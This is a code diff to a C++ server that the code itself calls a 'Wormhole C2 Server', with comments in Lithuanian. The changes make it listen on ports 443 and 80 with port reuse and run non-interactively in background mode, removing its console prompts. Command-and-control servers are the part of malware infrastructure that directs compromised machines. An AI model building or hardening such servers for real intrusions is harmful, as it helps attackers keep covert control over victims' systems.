@@ -353,8 +353,9 @@ void StartServer(int port) {
         throw runtime_error("Socket creation failed");
     }
 
+    // Pridėta SO_REUSEPORT parinktis
     int enable = 1;
-    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)) < 0) {
+    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &enable, sizeof(enable)) < 0) {
         close(server_socket);
         throw runtime_error("Setsockopt failed");
     }
@@ -366,7 +367,7 @@ void StartServer(int port) {
 
     if (bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
         close(server_socket);
-        throw runtime_error("Bind failed");
+        throw runtime_error(string("Bind failed on port ") + to_string(port) + ": " + strerror(errno));
     }
 
     if (listen(server_socket, SOMAXCONN) < 0) {
@@ -377,9 +378,6 @@ void StartServer(int port) {
     {
         lock_guard<mutex> lock(console_mutex);
         cout << "[*] Server started on port " << port << endl;
-        cout << "[*] Listening on all interfaces (INADDR_ANY)" << endl;
-        cout << "[*] Type 'list' to see the connected clients\n";
-        cout << "[*] Type 'exit' to shut down the server\n";
     }
 
     while (server_running) {
@@ -388,9 +386,7 @@ void StartServer(int port) {
         int client_socket = accept(server_socket, (sockaddr*)&client_addr, &client_addr_size);
 
         if (client_socket < 0) {
-            if (!server_running) break; // Server is shutting down
-            lock_guard<mutex> lock(console_mutex);
-            cerr << "Accept error" << endl;
+            if (!server_running) break;
             continue;
         }
 
@@ -530,25 +526,27 @@ int main() {
     ERR_load_crypto_strings();
 
     try {
+        // Paleidžiame serverį portuose 443 ir 80 (HTTP tikrinimui)
         thread server_thread(StartServer, 443);
-        
-        // Leidžiame serveriui užsikrauti
-        this_thread::sleep_for(milliseconds(500));
-        
-        CommandInterface();
+        thread http_thread(StartServer, 80);  // Papildomas portas HTTP tikrinimui
 
-        // Uždarome serverį gražiai
-        server_thread.detach();
+        // Non-interactive režimas
+        cout << "[*] Wormhole C2 Server started successfully\n";
+        cout << "[*] Running in background mode\n";
+        
+        while (server_running) {
+            this_thread::sleep_for(chrono::seconds(1));
+        }
+
+        server_thread.join();
+        http_thread.join();
     }
     catch (const exception& e) {
         cerr << "Critical error: " << e.what() << endl;
         return 1;
     }
 
-    // Clean up OpenSSL
     EVP_cleanup();
     ERR_free_strings();
-
     return 0;
 }
-
